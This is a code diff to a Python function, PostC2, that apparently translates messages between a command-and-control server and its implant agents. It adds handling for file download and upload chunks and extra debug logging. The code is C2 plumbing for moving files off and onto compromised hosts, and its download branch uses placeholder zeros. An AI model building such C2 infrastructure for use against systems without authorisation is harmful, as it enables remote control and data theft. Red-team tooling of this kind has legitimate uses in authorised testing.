@@ -60,6 +60,8 @@ def PostC2( Data ):
 
     RespTsk = [];
 
+    RespPostDbg( f"Raw Data: [{len(Data)} bytes] {Data}" );
+
     Psr = Parser( Data, len( Data ) );
     
     TaskUUID = Psr.Bytes().replace(b'\x00', b'')
@@ -71,25 +73,52 @@ def PostC2( Data ):
     CommandID = Psr.Pad( 2 );
     CommandID = int.from_bytes( CommandID, byteorder="big" );
 
-    UserOut  = "";
+    Output   = "";
     RawBytes = b'';
+    
+    if CommandID == T_DOWNLOAD:
+        JsonTsk = {
+            "task_id": TaskUUID,  
+            "download": {
+                "chunk_num": 0,
+                "file_id": 0,
+                "chunk_data": 0,
+                "chunk_size": 0
+           }
+        };
+        
+    elif CommandID == T_UPLOAD:
+        CurChunk  = Psr.Int32();
+        FileID    = Psr.Str();
+        Path      = Psr.Str();
+        ChunkSize = Psr.Int32();
 
-    try:
-        RawBytes = Psr.All();
-        UserOut  = RawBytes.hex();
-    except Exception as e:
-        RespPostDbg( f"failed get raw argument from agent: {e}" );
+        JsonTsk = {
+            "task_id": TaskUUID,
+            "upload": {
+                "chunk_num": CurChunk,
+                "file_id": FileID,
+                "full_path": Path,
+                "chunk_size": ChunkSize
+            }
+        };
+
+    else:
+
+        try:
+            RawBytes = Psr.All();
+            Output   = RawBytes.hex();
+        except Exception as e:
+            RespPostDbg( f"failed get raw argument from agent: {e}" );\
+            
+        JsonTsk = {
+            "task_id": TaskUUID,  
+            "process_response": Output,
+            "completed": True
+        };
 
     RespPostDbg( f"command id : {CommandID}" );
     RespPostDbg( f"task uuid  : {TaskUUID}" );
-    RespPostDbg( f"user output: {UserOut}" );
-
-    JsonTsk = {
-        "task_id": TaskUUID,  
-        "process_response": UserOut,
-        # "user_output": UserOut,
-        "completed": True
-    };
 
     RespTsk.append( JsonTsk );
     
@@ -99,7 +128,7 @@ def PostC2( Data ):
     };
 
     RespPostDbg( f"json data: {JsonData}" );
-    RespPostDbg( f"json task: {JsonTsk}" );
+    RespPostDbg( f"json task: {JsonTsk}"  );
 
     RespPostDbg( "------------------------" );
 
